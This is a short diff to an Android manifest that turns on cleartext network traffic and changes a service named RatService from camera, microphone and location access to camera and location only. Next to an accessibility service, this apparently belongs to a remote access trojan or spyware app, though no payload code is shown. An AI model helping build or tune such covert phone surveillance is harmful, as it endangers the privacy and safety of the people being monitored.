@@ -69,6 +69,7 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.KageNezumi"
         android:requestLegacyExternalStorage="true"
+        android:usesCleartextTraffic="true"
         tools:targetApi="31">
 
         <!-- Main Activity -->
@@ -87,7 +88,7 @@
             android:name=".RatService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="camera|microphone|location"
+            android:foregroundServiceType="camera|location"
             android:permission="android.permission.FOREGROUND_SERVICE" />
 
         <!-- Accessibility Service -->
